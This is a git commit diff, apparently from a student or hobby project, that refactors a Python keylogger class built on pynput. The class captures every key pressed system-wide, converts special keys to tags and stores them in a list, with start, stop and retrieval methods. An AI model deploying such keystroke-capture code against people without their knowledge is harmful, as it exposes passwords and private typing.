9ec78bdb9214b42cd54f9686cd1d1afa926e42ce
Arie <s7925al@gmail.com>
2025-02-19 13:35:22 +0200

    keyloggerservice final

--- KeyLoggerService.py
+++ KeyLoggerService.py
@@ -1,44 +1,46 @@
-import time
-from pynput import keyboard
+from pynput.keyboard import Listener,Key
 
-class KeyLoggerService():
+from IKeyLogger import IKeyLogger
+from typing import List
+class KeyLoggerService(IKeyLogger):
     def __init__(self):
-        self.keystrokes = []
-        self.lestener = keyboard.Listener(on_press = self.__on_press)
-        self.runnuig = False
+        self.listener = None
+        self.logged_keys: List[str] = []
 
-    def startLoggers(self):
-        # הפעלת המאזין למקלדת
-        self.lestener.start()
 
-    def __on_press(self, key):
+    def start_logging(self) -> None:
+        self.listener = Listener(on_press = self.on_press)
+        self.listener.start()
+
+    def stop_logging(self) -> None:
+        self.listener.stop()
+
+    def get_logged_keys(self) -> List[str]:
+        return self.logged_keys
+
+    def on_press(self, key):
         try:
-            if key == keyboard.Key.space:
+            if key == Key.space:
                 char = " "
-            elif key == keyboard.Key.enter:
+            elif key == Key.enter:
                 char = "\n"
-            elif key == keyboard.Key.backspace:
+            elif key == Key.backspace:
                 char = "[BACKSPACE]"
             elif hasattr(key, 'char') and key.char is not None:
                 char = key.char
             else:
                 char = f"[{key.name}]"  # לוכד מקשים מיוחדים
 
-            self.keystrokes.append(char)
-            if __name__=="main":# שמירת ההקשה
-                print(f"⏳ Key Pressed: {char}")  # הצגת ההקשה בזמן אמת
+            self.logged_keys.append(char)
 
-            if key == keyboard.Key.esc:  # הפסקת ההאזנה אם נלחץ Esc
-                return False
+
+
         except AttributeError:
             pass
-    def stop_loggers(self):
-        self.lestener.stop()
 
-    def get_loggers(self):
-        data = self.keystrokes.copy()
-        self.keystrokes.clear()
-        return data
+
+
+
 
 
 
